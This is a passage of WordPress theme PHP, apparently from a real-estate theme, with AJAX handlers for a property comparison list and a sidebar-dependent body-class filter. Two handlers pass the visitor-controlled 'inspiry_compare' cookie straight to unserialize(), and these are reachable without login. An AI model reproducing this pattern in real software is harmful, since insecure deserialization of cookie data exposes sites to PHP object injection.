					);
				}
			}
		} else {
			echo json_encode(
				array(
					'success' => false,
					'message' => esc_html__( 'Invalid Parameters', 'inspiry' ),
				)
			);
		}
		die();

	}

	add_action( 'wp_ajax_inspiry_add_to_compare', 'inspiry_add_to_compare' );
	add_action( 'wp_ajax_nopriv_inspiry_add_to_compare', 'inspiry_add_to_compare' );
}


if ( ! function_exists( 'inspiry_is_added_to_compare' ) ) {
	/**
	 * Check if a property is already added to compare list.
	 *
	 * @param $property_id
	 *
	 * @return bool
	 */
	function inspiry_is_added_to_compare( $property_id ) {

		if ( $property_id > 0 ) {
			/* check cookies for property id */
			if ( isset( $_COOKIE['inspiry_compare'] ) ) {
				$inspiry_compare = unserialize( $_COOKIE['inspiry_compare'] );
				if ( in_array( $property_id, $inspiry_compare ) ) {
					return true;
				}
			}
		}

		return false;
	}
}


if ( ! function_exists( 'inspiry_remove_from_compare' ) ) {
	/**
	 * Remove from compare
	 */
	function inspiry_remove_from_compare() {

		if ( isset( $_POST['property_id'] ) ) {

			$property_id = intval( $_POST['property_id'] );

			if ( $property_id > 0 ) {

				if ( isset( $_COOKIE['inspiry_compare'] ) ) {

					$inspiry_compare = unserialize( $_COOKIE['inspiry_compare'] );
					$target_index    = array_search( $property_id, $inspiry_compare );

					if ( $target_index >= 0 && $target_index !== false ) {
						unset( $inspiry_compare[ $target_index ] );
						setcookie( 'inspiry_compare', serialize( $inspiry_compare ), time() + ( 60 * 60 * 24 * 30 ), '/' );
						echo json_encode(
							array(
								'success'     => true,
								'property_id' => $property_id,
								'message'     => esc_html__( 'Removed Successfully!', 'inspiry' ),
							)
						);
						die();
					} else {
						echo json_encode(
							array(
								'success' => false,
								'message' => esc_html__( 'Failed to remove!', 'inspiry' ),
							)
						);
						die();
					}
				}
			}
		}

		echo json_encode(
			array(
				'success' => false,
				'message' => esc_html__( 'Invalid Parameters!', 'inspiry' ),
			)
		);
		die();
	}

	add_action( 'wp_ajax_inspiry_remove_from_compare', 'inspiry_remove_from_compare' );
	add_action( 'wp_ajax_nopriv_inspiry_remove_from_compare', 'inspiry_remove_from_compare' );
}


if ( ! function_exists( 'inspiry_theme_options_set' ) ) {
	/**
	 *  Return true if ID is set
	 *
	 * @param $id
	 *
	 * @return bool
	 * @since 1.7.0
	 */
	function inspiry_theme_options_set( $id ) {

		global $inspiry_options;

		if ( isset( $inspiry_options[ $id ] ) ) {
			return true;
		}

		return false;
	}
}


if ( ! function_exists( 'realplaces_content_width' ) ) {
	/**
	 * Adds css class to body when related sidebar is not active
	 */
	function realplaces_content_width( $classes ) {

		if ( is_home() && ! inspiry_is_active_custom_sidebar( 'default-sidebar' ) ) {

			$classes[] = 'realplaces-content-fullwidth blog-content-fullwidth';

		} elseif ( is_singular( 'post' ) && ! inspiry_is_active_custom_sidebar( 'default-sidebar' ) ) {

			$classes[] = 'realplaces-content-fullwidth single-content-fullwidth';

		} elseif ( is_page() && ! is_page_template() && ! inspiry_is_active_custom_sidebar( 'default-page-sidebar' ) ) {

			$classes[] = 'realplaces-content-fullwidth page-content-fullwidth';

		} elseif ( is_page_template( 'page-templates/properties-grid-with-sidebar.php' ) && ! inspiry_is_active_custom_sidebar( 'properties-grid' ) ) {

			$classes[] = 'realplaces-content-fullwidth properties-grid-content-fullwidth';

		} elseif ( is_page_template( 'page-templates/properties-list-with-sidebar.php' ) && ! inspiry_is_active_custom_sidebar( 'properties-list' ) ) {

			$classes[] = 'realplaces-content-fullwidth properties-list-content-fullwidth';

		}

		return $classes;
	}
}
add_filter( 'body_class', 'realplaces_content_width' );
